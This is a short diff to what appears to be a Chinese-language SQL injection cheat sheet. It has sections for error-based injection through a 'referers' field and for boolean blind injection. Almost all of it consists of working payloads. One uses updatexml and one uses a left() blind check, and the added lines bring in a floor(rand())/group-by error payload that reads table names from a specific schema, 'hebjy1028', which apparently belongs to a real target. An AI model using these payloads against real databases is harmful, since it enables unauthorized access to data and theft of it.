@@ -49,6 +49,9 @@ referers 错误注入:
  ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='referers' ),0x7e),1))#
 referers
 
+and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema='hebjy1028' limit 0,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a)b)#
+
+
 布尔盲注：
 
 and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e'--+
